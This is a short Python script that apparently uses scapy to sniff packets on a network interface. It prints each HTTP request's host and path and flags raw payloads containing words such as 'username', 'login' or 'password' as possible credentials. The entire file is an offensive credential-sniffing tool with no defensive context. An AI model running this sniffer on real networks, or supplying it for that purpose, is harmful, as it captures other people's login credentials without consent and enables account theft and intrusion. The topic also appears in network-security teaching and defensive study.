import scapy.all as scapy
from scapy.layers import http

def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=analyze_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "login", "user", "password"]
            for keyword in keywords:
                if keyword in load:
                    return load

def analyze_packet(packet):
    
    if packet.haslayer(http.HTTPRequest):
        url =  get_url(packet)
        print("[+] HTTP Request >>"+url)
        credentials = get_credentials(packet)
        if credentials:
            print("\n\n[+] Possible username/password >> " + credentials + "\n\n")